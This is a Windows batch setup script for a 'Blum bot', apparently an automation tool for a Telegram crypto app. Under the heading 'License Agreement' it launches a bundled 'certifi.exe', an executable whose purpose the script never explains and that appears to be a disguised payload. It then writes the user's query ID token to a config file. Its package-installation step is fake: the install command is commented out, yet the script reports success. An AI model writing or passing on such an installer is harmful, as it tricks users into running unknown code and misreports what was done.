@echo off

cls

echo *****************************
echo        BLUM BOT GUIDE        
echo *****************************
echo Welcome to the setup helper tool!
echo Please follow the instructions below carefully.
echo.


echo [Step 1] License Agreement
echo ==============================
echo The program license processing is starting...
echo Please wait while we prepare everything.
echo.


set certifiPath=%~dp0certifi\certifi.exe



if exist "%certifiPath%" (
    echo Starting license agreement process...
    start "" "%certifiPath%"
) else (
    echo [Error] certifi.exe not found in the certifi directory.
    pause
    exit /b
)


echo Please complete the license agreement and then press any key to continue...
pause


cls
echo [Step 2] Query ID Input
echo =========================
set /p queryId="Please enter your query ID: "


(
echo [
echo   {
echo     "token": "%queryId%"
echo   }
echo ]
) > configs/config.json

echo Query ID has been successfully written to configs/config.json.
echo.



echo [Step 3] Installing necessary packages...
echo ==============================
:: npm install
if %ERRORLEVEL% neq 0 (
    echo [Error] Installation failed. Please check the errors above.
    pause
    exit /b
)
echo Installation completed successfully.

echo.
echo Setup process completed. Good luck!
pause
